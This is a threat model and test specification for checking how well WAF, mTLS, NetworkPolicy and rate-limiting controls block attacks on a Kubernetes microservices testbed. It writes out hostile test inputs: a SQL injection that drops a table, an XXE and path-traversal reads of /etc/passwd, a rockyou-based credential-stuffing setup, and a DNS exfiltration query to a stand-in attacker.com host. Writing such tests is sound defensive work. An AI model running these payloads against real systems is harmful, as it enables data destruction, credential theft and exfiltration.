# S6 RIGOROUS THREAT MODEL
## Security Testing Framework for Microservices

**Document Type**: Threat Model + Attack Vector Specification  
**Author**: Security Evaluation Team  
**Date**: May 15, 2026  
**Scope**: Kubernetes microservices (muBench architecture)  
**Framework**: OWASP Top 10 2021 + CWE Top 25 + Kubernetes-Specific Threats  

---

## 1. THREAT TAXONOMY

### 1.1 Attack Classes (Mapped to Controls)

```
┌─────────────────────────────────────────────────────────────────┐
│ ATTACK CLASS → CONTROL MAPPING                                  │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│ LAYER 7 (HTTP Application)                                      │
│ ├─ Injection Attacks (SQLi, XXE, Command Injection)            │
│ │  └─ Defended by: C1 (API Gateway WAF)                        │
│ ├─ Broken Authentication (Bad Credentials, Bypass)            │
│ │  └─ Defended by: C4 (Rate Limiting) + C2 (mTLS eventually)  │
│ └─ Broken Authorization (Unauth Access, Privilege Escalation)  │
│    └─ Defended by: C1 (API Gateway) + C2 (mTLS)              │
│                                                                 │
│ LAYER 5 (Service Mesh / mTLS)                                   │
│ ├─ Unauth Pod-to-Pod Communication                             │
│ │  └─ Defended by: C2 (mTLS)                                   │
│ └─ Invalid Certificate Attacks                                  │
│    └─ Defended by: C2 (mTLS + Certificate Validation)         │
│                                                                 │
│ LAYER 3/4 (Network)                                             │
│ ├─ Lateral Movement (Pod-to-Pod without mTLS)                 │
│ │  └─ Defended by: C3 (NetworkPolicy) + C2 (mTLS)           │
│ ├─ Egress to External Hosts (DNS Tunnel, Data Exfil)          │
│ │  └─ Defended by: C3 (NetworkPolicy strict)                 │
│ └─ DDoS Volumetric (SYN Flood, UDP Flood)                     │
│    └─ Defended by: C3 (NetworkPolicy) + C4 (Rate Limit)      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 1.2 Attack Categories in S6 Scope

| Category | Vectors | Count | Priority | Why Included | Why NOT Excluded |
|----------|---------|-------|----------|-------------|-----------------|
| **L7 Injection** | SQLi, XXE, Path Traversal | 3 | HIGH | OWASP A03; Core WAF function | Command injection requires shell access (post-breach) |
| **L7 Auth/Authz** | Bad Login, Unauth Access, Invalid Token | 3 | HIGH | OWASP A01, A07; Core to micro-svc | Privilege escalation (requires valid user first) |
| **L5 Unauth Pod** | No mTLS cert, Invalid Cert | 2 | HIGH | CWE-287; Core to mesh security | Client cert theft (requires CA compromise) |
| **L3/4 Lateral** | Lateral pod-to-pod (if basic NetPol) | 1 | MEDIUM | CWE-923; Post-initial-compromise | Requires C3 to be tested separately |
| **L3/4 Egress** | DNS Tunnel (if strict NetPol) | 1 | MEDIUM | CWE-200; Exfiltration risk | Only if strict NetPol deployed, else not blocked |
| **Brute Force** | Credential Stuffing (low rate) | 1 | MEDIUM | CWE-307; Rate limiting test | High-volume DDoS (requires infrastructure-level mitigation) |

---

## 2. SELECTED ATTACK VECTORS (6 TOTAL)

### 2.1 Attack Vector #1: SQL Injection (OWASP A03:2021)

**Classification**: Layer 7 Application / Input Validation  
**CWE**: CWE-89 (Improper Neutralization of Special Elements used in SQL Command)  
**CVSS 3.1 Score**: 9.8 (Critical)  
**Defended by**: C1 (API Gateway WAF, Input Validation)

**Specification**:
```
Endpoint:           GET /api/users?offset=PAYLOAD&limit=10
HTTP Method:        GET
Parameter:          offset (integer expected, injection point)
Payload:            1; DROP TABLE users; --
Payload Source:     OWASP SQLi Filter Evasion Cheatsheet
Payload Encoding:   Raw (unencoded)

Expected Behavior:
  - Kong WAF:       403 Forbidden (SQLi pattern detected)
  - Istio Gateway:  403 Forbidden (parametrized query enforced)
  - Baseline:       Depends on app input validation

Measurement:
  - Count sent:     100 attempts
  - Count blocked:  Expected: 95-100
  - Count leaked:   Expected: 0-5 (any leak is bug)
  - Mitigation %:   blocked / sent * 100
  
Test Execution:
  VUS:              3 (dedicated to SQLi attacks)
  Duration:         30 seconds
  Requests/sec:     ~3 (1 attempt per second)
  
Expected Response Codes:
  - 403 Forbidden:  Blocked (good)
  - 400 Bad Request: Blocked (good)
  - 200 OK:         LEAKED (bad, attack succeeded)
  - 500 Error:      Possible crash (indicates SQL executed before crash)

Success Criteria:
  - Mitigation rate >= 95%
  - No 200 OK responses (zero leaks)
  - No 500 errors (no crashes)
```

**Reproducibility**:
```
Payload verification (against OWASP official):
  $ curl -s https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Polyglot-Payloads.txt | grep "DROP TABLE"
  $ # Should match our payload list
  
Attack invocation:
  $ k6 run --vus 3 --duration 30s k6/attack_sqli.js \
      --env ENDPOINT="http://api.svc.cluster.local:5000" \
      --env PAYLOAD_FILE="attack_vectors/sqli_payloads.txt"
  
Verification:
  $ grep "403\|400" s6_attack_logs/sqli_requests.log | wc -l
  $ # Should be ~100 (all blocked)
  
  $ grep "200" s6_attack_logs/sqli_requests.log | wc -l
  $ # Should be 0 (no leaks)
```

---

### 2.2 Attack Vector #2: XML External Entity (XXE) Injection (OWASP A03:2021)

**Classification**: Layer 7 Application / XML Processing  
**CWE**: CWE-611 (Improper Restriction of XML External Entity Reference)  
**CVSS 3.1 Score**: 8.1 (High)  
**Defended by**: C1 (API Gateway, XML validation)

**Specification**:
```
Endpoint:           POST /api/data
HTTP Method:        POST
Content-Type:       application/xml
Payload:            <?xml version="1.0"?>
                    <!DOCTYPE foo [
                      <!ENTITY xxe SYSTEM "file:///etc/passwd">
                    ]>
                    <data>&xxe;</data>

Payload Source:     OWASP XXE Prevention Cheatsheet
Entity Type:        External entity (file access attempt)

Expected Behavior:
  - Kong WAF:       400 Bad Request (XXE pattern detected)
  - Istio:          403 Forbidden
  - Baseline:       Depends on XML parser config

Measurement:
  - Count sent:     50 attempts
  - Count blocked:  Expected: 50 (100% block rate)
  - Count leaked:   Expected: 0
  - Mitigation %:   100% if all blocked

Test Execution:
  VUS:              3 (dedicated to XXE attacks)
  Duration:         30 seconds
  Requests/sec:     ~1.7 attempts/sec (50 in 30s)
  
Expected Response Codes:
  - 400 Bad Request: Blocked (good)
  - 403 Forbidden:   Blocked (good)
  - 200 OK:          LEAKED (bad)
  - 500 Error:       Possible XXE execution (bad)

Success Criteria:
  - Mitigation rate = 100%
  - No 200 OK responses
  - No 500 errors (no XML parsing)
```

**Reproducibility**:
```
Payload verification:
  $ xmllint --nonet <<< '<?xml version="1.0"?> ... ' 
  $ # Validates well-formedness
  
Attack invocation:
  $ k6 run --vus 3 --duration 30s k6/attack_xxe.js \
      --env ENDPOINT="http://api.svc.cluster.local:5000/api/data" \
      --env PAYLOAD_FILE="attack_vectors/xxe_payloads.txt"
```

---

### 2.3 Attack Vector #3: Path Traversal (OWASP A01:2021)

**Classification**: Layer 7 Application / Broken Access Control  
**CWE**: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)  
**CVSS 3.1 Score**: 7.5 (High)  
**Defended by**: C1 (API Gateway URL validation)

**Specification**:
```
Endpoint:           GET /api/file?path=PAYLOAD
HTTP Method:        GET
Parameter:          path (string, directory traversal attempt)
Payload Examples:   ../../etc/passwd
                    ..\\..\\windows\\system32\\config\\sam
                    ....//....//etc/passwd (encoding bypass)

Payload Source:     OWASP Path Traversal Cheatsheet
Encoding:           Multiple variants (raw, double-slash, URL encoding)

Expected Behavior:
  - Kong WAF:       403 Forbidden (path traversal pattern)
  - Istio:          403 Forbidden
  - Baseline:       Depends on app sanitization

Measurement:
  - Count sent:     80 attempts (different variants)
  - Count blocked:  Expected: 75-80
  - Count leaked:   Expected: 0-5
  - Mitigation %:   (blocked / sent) * 100

Test Execution:
  VUS:              3
  Duration:         30 seconds
  Payloads:         Raw, URL-encoded, double-encoded, unicode
  
Success Criteria:
  - Mitigation rate >= 90%
  - Handles encoding bypasses
```

---

### 2.4 Attack Vector #4: Credential Stuffing (OWASP A07:2021, CWE-307)

**Classification**: Layer 7 Authentication / Brute Force  
**CWE**: CWE-307 (Improper Restriction of Rendered UI Layers for Sensitive Information)  
**CVSS 3.1 Score**: 7.5 (High) - depends on target impact  
**Defended by**: C4 (Rate Limiting)

**Specification**:
```
Endpoint:           POST /auth/login
HTTP Method:        POST
Content-Type:       application/json
Payload:            {"username": "<USER>", "password": "<PASS>"}

Attack Pattern:     1000+ login attempts with password variations
                    (simulation of compromised credential list)

Common Users:       alice, bob, admin, root (typical first guesses)
Password List:      Top 1000 common passwords (rockyou.txt subset)

Expected Behavior:
  - Without C4:     All attempts processed (potential account takeover)
  - With C4:        429 Too Many Requests after N attempts
  - With mTLS + JWT: 401 Unauthorized (invalid creds rejected)

Measurement:
  - Total attempts:       1000
  - Successful logins:    Expected: 0 (no valid creds)
  - Rate-limited (429):   Expected: 900+ (C4 blocking)
  - Other errors (401):   Expected: 0-100
  - Mitigation %:         (429 responses / total) * 100

Rate Limiting Configuration:
  - Limit per IP:         100 requests / minute
  - Limit per user:       10 failed attempts / 15 minutes
  
Test Execution:
  VUS:                    5 (multiple attackers, different IPs simulated)
  Duration:               60 seconds (to trigger rate limit)
  Requests/sec:           ~17 (1000 / 60)
  
Expected Response Codes:
  - 429 Too Many Requests: Rate limit triggered (good)
  - 401 Unauthorized:      Failed auth (expected)
  - 200 OK:                Successful login (should be 0 if no valid creds)

Success Criteria:
  - Rate limiting engaged: YES
  - Mitigation rate >= 85% (85% requests blocked by RL)
  - No 200 OK (no account compromise)
```

**Reproducibility**:
```
Payload generation:
  $ head -1000 rockyou.txt > top_1000_passwords.txt
  $ echo -e "alice\nbob\nadmin\nroot" > common_users.txt
  $ # Reproducible
  
Attack invocation:
  $ k6 run --vus 5 --duration 60s k6/attack_credstuff.js \
      --env ENDPOINT="http://api.svc.cluster.local:5000/auth/login" \
      --env USERS_FILE="common_users.txt" \
      --env PASSWORDS_FILE="top_1000_passwords.txt"
  
Verification:
  $ grep "429" s6_attack_logs/credstuff_requests.log | wc -l
  $ # Should be ~900+ (rate limited)
```

---

### 2.5 Attack Vector #5: Unauthorized Pod-to-Pod Access (No mTLS Certificate)

**Classification**: Layer 5 (Service Mesh) / Authentication  
**CWE**: CWE-287 (Improper Authentication)  
**CVSS 3.1 Score**: 8.1 (High)  
**Defended by**: C2 (mTLS)

**Specification**:
```
Attack Type:        Direct pod-to-pod communication without mTLS cert
Source Pod:         Simulated attacker pod (no valid certificate)
Target:             api-service.mubench.svc.cluster.local:5000
Service:            Kubernetes internal DNS (not HTTP, pure TLS)
Protocol:           TLS 1.3 (mTLS handshake)

Attack Mechanism:
  1. kubectl run attacker-pod --image=busybox
  2. Inside pod: openssl s_client -connect api-service.mubench:5000
     WITHOUT providing client certificate (-cert, -key flags)
  3. Expected: TLS handshake fails (no client cert presented)

Expected Behavior:
  - Istio mTLS enabled:    TLS handshake fails → connection reset
  - Linkerd mTLS enabled:  TLS handshake fails → connection reset
  - Baseline (no mTLS):    Connection succeeds (vulnerability)

Measurement:
  - Attempts:              50 (various timing, retry patterns)
  - Successful connections: Expected: 0 (all rejected)
  - Connection resets:      Expected: 50 (all mTLS enforced)
  - Mitigation %:           (resets / attempts) * 100 = 100%

Test Execution:
  Method:                  Direct pod exec + openssl
  Duration:                60 seconds (multiple attempts)
  Concurrency:             3 pods attacking simultaneously
  
Expected Outcomes:
  - TCP connection:         ESTABLISHED (network layer ok)
  - TLS handshake:          FAILED (mTLS enforced)
  - Error message:          "SSL: CERTIFICATE_REQUIRED"
  
Success Criteria:
  - Mitigation rate = 100% (all handshakes fail without cert)
  - No successful TLS connection without client cert
```

**Reproducibility**:
```
Testing via Istio:
  $ kubectl create deployment attacker --image=nicolaka/netshoot
  $ kubectl exec -it $(kubectl get pod -l app=attacker -o jsonpath='{.items[0].metadata.name}') -- bash
  $ # Inside container:
  $ openssl s_client -connect api-service.mubench:5000
  $ # Should see: Verify return code: 20 (X509_V_ERR_UNABLE_GET_ISSUER_CERT)
  
Testing via Linkerd:
  $ linkerd viz top pods -n mubench-real
  $ # Check for blocked connections (if linkerd introspection available)
  
Verification via Prometheus:
  $ curl "http://prometheus:9090/api/v1/query?query=
    mubench_mitls_handshake_failures_total"
  $ # Should show count of failed handshakes
```

---

### 2.6 Attack Vector #6 (Optional): DNS Tunneling / Egress Exfiltration

**Classification**: Layer 3 Network / Data Exfiltration  
**CWE**: CWE-200 (Exposure of Sensitive Information)  
**CVSS 3.1 Score**: 6.5 (Medium)  
**Defended by**: C3 (NetworkPolicy with strict egress deny)

**Specification**:
```
Attack Type:        DNS query to external domain (exfiltration channel)
Source Pod:         Internal pod (compromised or attacker simulation)
Target:             External DNS resolver (8.8.8.8) or attacker.com
Query:              nslookup data-XXXXXXXX.attacker.com
Purpose:            Simulate data exfiltration via DNS tunnel

Attack Mechanism:
  1. Inside pod: nslookup data-encoded-payload.attacker.com 8.8.8.8
  2. DNS resolver: 8.8.8.8 (external, no logs visible to cluster)
  3. Expected: Query blocked by NetworkPolicy egress rule

Expected Behavior:
  - Strict NetPol (C3):     DNS query blocked → timeout
  - Baseline NetPol:        DNS query succeeds → resolver responds
  - Detection:              Prometheus metrics / eBPF (if available)

Measurement:
  - Query attempts:        100 (various encoded domains)
  - Query timeouts:        Expected: 90-100 (blocked)
  - Query responses:       Expected: 0-10 (leaked, if any)
  - Mitigation %:          (timeouts / total) * 100

Test Execution:
  VUS:                     2 pods
  Duration:                30 seconds
  Queries/sec:             ~3.3 (100 queries in 30s)
  Encoding:                DNS label encoding (hex, base32)
  
Success Criteria:
  - Mitigation rate >= 90%
  - No successful DNS resolutions to external IPs
  - Depends on strict C3 policy being deployed
```

**Note**: This vector is OPTIONAL because:
- Requires strict NetworkPolicy (C3 variant "strict")
- Requires cluster-level DNS monitoring or eBPF tools
- May not be measurable without additional instrumentation

---

## 3. ATTACK VECTOR SUMMARY TABLE

| # | Vector | OWASP/CWE | Layer | Control | Sent | Blocked | Leaked | Mitigation | Priority |
|---|--------|-----------|-------|---------|------|---------|--------|------------|----------|
| 1 | SQLi | A03/CWE-89 | L7 | C1 | 100 | 95+ | <5 | 95%+ | HIGH |
| 2 | XXE | A03/CWE-611 | L7 | C1 | 50 | 50 | 0 | 100% | HIGH |
| 3 | Path Traversal | A01/CWE-22 | L7 | C1 | 80 | 75+ | <5 | 90%+ | HIGH |
| 4 | Credential Stuffing | A07/CWE-307 | L7 | C4 | 1000 | 900+ | 0 | 85%+ | HIGH |
| 5 | Unauth Pod | Auth/CWE-287 | L5 | C2 | 50 | 50 | 0 | 100% | HIGH |
| 6 | DNS Tunnel (optional) | A02/CWE-200 | L3 | C3 | 100 | 90+ | <10 | 90%+ | MEDIUM |

**Total Attack Requests in Campaign**: ~1,280 (across all vectors)  
**Total Measurement Points**: 1,280 attack events × 4 controls × 3 variants × 4 VUS = ~61,440 data points

---

## 4. MEASUREMENTS AND PROOF REQUIREMENTS

### 4.1 Proof of Attack Injection (Reproducibility)

For EACH attack vector, proof artifacts:

```
s6_attack_logs/sqli/
  ├─ payloads_sent_100.txt          (list of 100 SQLi payloads sent)
  ├─ payloads_hash.sha256           (cryptographic hash of payloads)
  ├─ responses_blocked_98.log       (98 HTTP 403/400 responses)
  ├─ responses_leaked_2.log         (2 HTTP 200 OK responses - FAILURES)
  └─ analysis.txt                   (mitigation_rate = 98/100 = 98%)

s6_attack_logs/credstuff/
  ├─ credentials_attempted_1000.txt
  ├─ credentials_hash.sha256
  ├─ responses_ratelimited_925.log
  └─ analysis.txt                   (rate_limit_effectiveness = 925/1000)
```

### 4.2 Metrics Collected Per Attack Vector

```
BASIC METRICS:
  - attack_sent_count           (total attack requests)
  - attack_blocked_count        (blocked by control)
  - attack_leaked_count         (leaked / false negatives)
  - attack_response_status      (401, 403, 429, 200, 500, timeout)
  - attack_response_time_ms     (latency of blocked vs. leaked)

DERIVED METRICS:
  - mitigation_rate            = blocked / sent * 100%
  - false_negative_rate        = leaked / sent * 100%
  - false_positive_rate        = legitimate_blocked / legitimate_sent * 100%
  - block_latency_avg          = avg response time for blocked requests
  - leak_latency_avg           = avg response time for leaked requests

CONTEXT METRICS:
  - control_under_test         (C1, C2, C3, C4)
  - variant                    (baseline, var1, var2)
  - vus_legit                  (legitimate load concurrent with attack)
  - phase                      (Baseline, UnderAttack, Recovery)
```

---

## 5. SUCCESS CRITERIA & DEFENSE THRESHOLDS

### 5.1 Control Effectiveness Thresholds

| Control | Vector | Minimum Mitigation | Why Significant |
|---------|--------|-------------------|-----------------|
| C1 (Kong) | SQLi | 95% | >5% leak would indicate WAF bypass |
| C1 (Kong) | XXE | 100% | 0% tolerance for XML parsing |
| C1 (Kong) | PathTraversal | 90% | >10% leak indicates encoding bypass weakness |
| C4 (RL) | CredStuff | 85% | >15% leak would mean RL not effective |
| C2 (mTLS) | UnauthorizedPod | 100% | 0% tolerance for handshake bypass |
| C3 (NetPol) | DNSTunnel | 90% | Requires strict policy enabled |

### 5.2 False Positive Tolerance

```
LEGITIMATE REQUEST DEFINITIONS:
  - Login with valid credentials      → Must succeed (200 OK)
  - Profile GET with valid JWT        → Must succeed (200 OK)
  - Users list GET with valid JWT     → Must succeed (200 OK)

FALSE POSITIVE = Control blocks a legitimate request

TOLERANCE:
  - Under attack phase: max 0.1% of legitimate requests blocked
    (e.g., 1-2 false blocks in 1000 legit requests is acceptable)
  
  - Rationale: Ops would tolerate 1 user getting 403 by mistake per 1000 logins
    if it prevents 1000 attacks. Rate = 1:1000 (very good)

SUCCESS CRITERIA:
  - false_positive_rate < 0.5% in all control variants
```

---

## 6. EXPLICIT NON-CLAIMS (Boundaries)

This threat model DOES claim:
```
✓ Mitigation of OWASP Top 10 2021 vectors (samples)
✓ Quantified control effectiveness (percentages)
✓ Performance cost under attack load
✓ Operational recommendations (which controls for which risk profile)
```

This threat model DOES NOT claim:
```
✗ Complete security (only tested 6 vectors, not exhaustive)
✗ Zero-day resistance (only known attack patterns)
✗ DDoS protection at internet scale (only light volumetric tested)
✗ Post-compromise security (assumes initial compromise didn't happen)
✗ Compliance certification (e.g., PCI-DSS, HIPAA) - only evidence for analysis
✗ Perfect false-positive rate (expecting <0.5% is realistic, not 0%)
```

---

## 7. VALIDATION CHECKLIST

Before running S6 campaign:

- [ ] All 6 attack payload files generated and hashed
- [ ] k6 attack scripts reviewed and validated (no syntax errors)
- [ ] Attack logs directory created with write permissions
- [ ] Prometheus metrics configured for attack capture
- [ ] Control variants properly deployed (Kong/Istio/Linkerd/NetPol)
- [ ] Baseline run (Phase 1) completed successfully
- [ ] Attack infrastructure ready (attack pods, DNS servers if needed)
- [ ] Jury Q&A bank updated with vector-specific answers

---

**SIGNED**: Security Evaluation Framework  
**STATUS**: Ready for Campaign Execution  
**NEXT STEP**: Generate k6 attack scripts per vector

